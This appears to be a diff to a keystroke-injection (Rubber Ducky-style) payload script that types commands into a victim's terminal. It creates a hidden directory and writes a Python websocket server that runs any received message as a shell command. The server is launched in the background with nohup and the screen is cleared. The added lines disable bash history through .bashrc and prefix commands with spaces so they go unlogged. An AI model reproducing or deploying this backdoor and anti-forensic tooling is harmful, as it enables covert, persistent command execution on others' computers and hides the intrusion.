@@ -35,17 +35,21 @@ DELAY 500
 STRING Terminal
 DELAY 500
 ENTER
+DELAY 500 
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
 DELAY 500
-STRING mkdir ~/.phantom_ws && cd ~/.phantom_ws
 ENTER
 DELAY 500
-STRING echo 'import asyncio\nimport websockets\nimport subprocess\n\nasync def execute_command(websocket, path):\n    async for message in websocket:\n        cmd = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n        cmd_output = cmd.stdout.read() + cmd.stderr.read()\n        await websocket.send(cmd_output.decode())\n\nstart_server = websockets.serve(execute_command, "localhost", 8765)\n\nasyncio.get_event_loop().run_until_complete(start_server)\nasyncio.get_event_loop().run_forever()' > server.py
+STRING  mkdir ~/.phantom_ws && cd ~/.phantom_ws
 ENTER
 DELAY 500
-STRING nohup python3 server.py > /dev/null 2>&1 &
+STRING  echo 'import asyncio\nimport websockets\nimport subprocess\n\nasync def execute_command(websocket, path):\n    async for message in websocket:\n        cmd = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n        cmd_output = cmd.stdout.read() + cmd.stderr.read()\n        await websocket.send(cmd_output.decode())\n\nstart_server = websockets.serve(execute_command, "localhost", 8765)\n\nasyncio.get_event_loop().run_until_complete(start_server)\nasyncio.get_event_loop().run_forever()' > server.py
 ENTER
 DELAY 500
-STRING clear
+STRING  nohup python3 server.py > /dev/null 2>&1 &
+ENTER
+DELAY 500
+STRING  clear
 ENTER
 
 
